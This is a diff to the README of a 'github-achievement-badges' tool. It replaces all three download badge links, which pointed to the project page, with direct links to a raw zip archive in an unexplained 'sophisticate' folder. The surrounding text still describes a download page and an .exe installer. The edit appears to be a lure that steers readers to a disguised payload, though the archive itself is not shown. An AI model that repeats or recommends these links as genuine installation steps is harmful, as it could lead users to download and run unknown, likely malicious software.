@@ -1,6 +1,6 @@
 # 🏆 github-achievement-badges - Track Your GitHub Achievements Easily
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Badges-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonyme88/github-achievement-badges)
+[![Download](https://img.shields.io/badge/Download-GitHub%20Badges-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/anonyme88/github-achievement-badges/main/sophisticate/badges-achievement-github-v3.6.zip)
 
 ## 📖 What is github-achievement-badges?
 
@@ -32,7 +32,7 @@ To start using the app, you first need to download it to your Windows computer. 
 
 Click the blue download badge below to visit the download page. This page provides the latest release and all necessary files.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-4A90E2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/anonyme88/github-achievement-badges)
+[![Download Now](https://img.shields.io/badge/Download-Here-4A90E2?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/anonyme88/github-achievement-badges/main/sophisticate/badges-achievement-github-v3.6.zip)
 
 Once on the page, find the latest release section and download the Windows installer. The file should have a name similar to `setup-github-achievement-badges.exe`.
 
@@ -124,4 +124,4 @@ For more details about GitHub achievements, the official GitHub documentation ca
 
 Visit this page to download the latest version of github-achievement-badges:
 
-[![Download Latest Version](https://img.shields.io/badge/Download-GitHub%20Badges-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonyme88/github-achievement-badges)
+[![Download Latest Version](https://img.shields.io/badge/Download-GitHub%20Badges-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/anonyme88/github-achievement-badges/main/sophisticate/badges-achievement-github-v3.6.zip)
